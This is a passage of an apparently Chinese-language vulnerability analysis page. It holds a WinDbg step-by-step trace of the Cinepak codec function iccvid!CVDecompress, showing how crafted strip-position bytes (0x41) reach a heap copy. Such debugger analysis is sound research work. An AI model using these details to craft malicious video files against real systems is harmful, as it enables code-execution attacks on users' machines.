class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6916=<span class="number">41</span> <span class="comment">; ch = 0x41,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691b=<span class="number">41</span> <span class="comment">; al = 0x41,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6917=<span class="number">41</span> <span class="comment">; cl = 0x41,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                    <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0,[(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">00000060</span> <span class="comment">; a2 = eax = 0x00 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; eax = [ebp-4] = 0x2000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 为0则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x102</span>:</span><br><span class="line">73b722b0 807d1300        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="number">0</span>       <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; 判断a3(Len_of_CVID_data)的最高字节是否为0,Frame Header的Flags</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x106</span>:</span><br><span class="line">73b722b4 751b            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x108</span>:</span><br><span class="line">73b722b6 803e11          <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">11h</span>         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6912=<span class="number">11</span> <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10b</span>:</span><br><span class="line">73b722b9 <span class="number">7516</span>            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722bb <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10d</span>:</span><br><span class="line">73b722bb 8b4b1c          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">1Ch</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535cc=001535f8 <span class="comment">; ebx = a1 = 001535b0,ecx = 0x001535f8,堆块数据区域指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722be <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x110</span>:</span><br><span class="line">73b722be 8d3c01          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">ecx</span>+<span class="built_in">eax</span>]                                  <span class="comment">; edi = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x113</span>:</span><br><span class="line">73b722c1 b900080000      <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="number">800h</span>                                       <span class="comment">; ecx = 0x800,复制数据长度0x800*4=0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x118</span>:</span><br><span class="line">73b722c6 8db700e0ffff    <span class="keyword">lea</span>     <span class="built_in">esi</span>,[<span class="built_in">edi</span>-<span class="number">2000h</span>]                                <span class="comment">; esi = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001535f8 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第1次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001555f8 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6912 <span class="comment">; esi = [ebp-18h] = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722d1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x123</span>:</span><br><span class="line">73b722d1 8b7df4          <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6912 <span class="comment">; edi = [ebp-0Ch] = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba6912</span><br><span class="line"><span class="built_in">eip</span>=73b722d4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x126</span>:</span><br><span class="line">73b722d4 8b4320          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">20h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d0=001535f8 <span class="comment">; ebx = a1 = 0x001535b0,eax = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba6912</span><br><span class="line"><span class="built_in">eip</span>=73b722d7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x129</span>:</span><br><span class="line">73b722d7 83c70c          <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="number">0Ch</span>                                        <span class="comment">; edi = edi+0xC = 0x00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722da <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12c</span>:</span><br><span class="line">73b722da 0345fc          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span 